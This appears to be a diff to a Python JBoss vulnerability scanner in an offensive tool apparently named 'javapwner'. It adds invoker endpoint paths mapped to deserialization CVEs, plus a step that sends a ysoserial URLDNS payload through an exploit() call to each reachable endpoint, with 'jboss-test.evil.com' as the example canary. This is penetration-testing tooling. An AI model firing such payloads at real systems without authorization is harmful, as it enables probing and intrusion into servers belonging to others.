@@ -22,6 +22,11 @@ _PATH_CVE_MAP = {
     "/invoker/EJBInvokerServlet": "CVE-2017-7504",
     "/invoker/readonly": "CVE-2017-12149",
     "/web-console/Invoker": "CVE-2015-7501 (web-console variant)",
+    "/remoting/httpInvoker": "Spring-HTTP-Invoker-Deser",
+    "/spring-remoting/": "Spring-HTTP-Invoker-Deser",
+    "/remoting/": "Spring-HTTP-Invoker-Deser",
+    "/jmx-console/": "JBoss-JMX-Console",
+    "/admin-console/": "JBoss-Admin-Console",
 }
 
 
@@ -42,6 +47,10 @@ class JBossScanResult:
     invoker_endpoints: list[str] = field(default_factory=list)
     invoker_cves: list[str] = field(default_factory=list)
 
+    # URLDNS canary (I.6)
+    urldns_sent: bool = False
+    urldns_canary: str | None = None
+
     # Error
     error: str | None = None
 
@@ -53,6 +62,8 @@ class JBossScanResult:
             "fingerprint": self.fingerprint.to_dict() if self.fingerprint else None,
             "invoker_endpoints": self.invoker_endpoints,
             "invoker_cves": self.invoker_cves,
+            "urldns_sent": self.urldns_sent,
+            "urldns_canary": self.urldns_canary,
             "error": self.error,
         }
 
@@ -71,12 +82,26 @@ class JBossScanner:
     def __init__(self, timeout: float = 5.0):
         self.timeout = timeout
 
-    def scan(self, host: str, port: int) -> JBossScanResult:
-        """Run the full scan: fingerprint → invoker enumeration."""
+    def scan(
+        self,
+        host: str,
+        port: int,
+        scheme: str = "http",
+        urldns_canary: str | None = None,
+    ) -> JBossScanResult:
+        """Run the full scan: fingerprint → invoker enumeration → optional URLDNS.
+
+        Parameters
+        ----------
+        urldns_canary:
+            If provided (e.g. ``'jboss-test.evil.com'``), send a URLDNS
+            payload via each reachable invoker endpoint to detect blind
+            deserialization.  Check DNS logs for resolution.
+        """
         result = JBossScanResult(host=host, port=port)
 
         # Step 1: fingerprint
-        fingerprinter = JBossFingerprinter(timeout=self.timeout)
+        fingerprinter = JBossFingerprinter(timeout=self.timeout, scheme=scheme)
         try:
             fp = fingerprinter.fingerprint(host, port)
             result.fingerprint = fp
@@ -87,7 +112,6 @@ class JBossScanner:
             return result
 
         if not result.is_open:
-            # Try a basic TCP connect to confirm the port is open at all
             try:
                 with socket.create_connection((host, port), timeout=self.timeout):
                     result.is_open = True
@@ -96,7 +120,7 @@ class JBossScanner:
                 return result
 
         # Step 2: HTTP invoker enumeration
-        invoker = HttpInvoker(timeout=self.timeout)
+        invoker = HttpInvoker(timeout=self.timeout, scheme=scheme)
         try:
             reachable = invoker.probe_endpoints(host, port)
             result.invoker_endpoints = reachable
@@ -106,4 +130,33 @@ class JBossScanner:
         except Exception as exc:
             result.error = f"Invoker probe error: {exc}"
 
+        # Step 3: URLDNS canary — blind deserialization detection (I.6)
+        if urldns_canary and result.invoker_endpoints:
+            self._urldns_probe(host, port, urldns_canary, result, invoker)
+
         return result
+
+    def _urldns_probe(
+        self,
+        host: str,
+        port: int,
+        canary: str,
+        result: JBossScanResult,
+        invoker: HttpInvoker,
+    ) -> None:
+        """Send a URLDNS ysoserial payload via each reachable invoker endpoint."""
+        try:
+            from javapwner.core.payload import YsoserialWrapper
+            wrapper = YsoserialWrapper()
+            payload = wrapper.generate_urldns(canary)
+        except Exception:
+            return
+
+        for path in result.invoker_endpoints:
+            try:
+                invoker.exploit(host, port, payload, path=path)
+            except Exception:
+                continue
+
+        result.urldns_sent = True
+        result.urldns_canary = canary
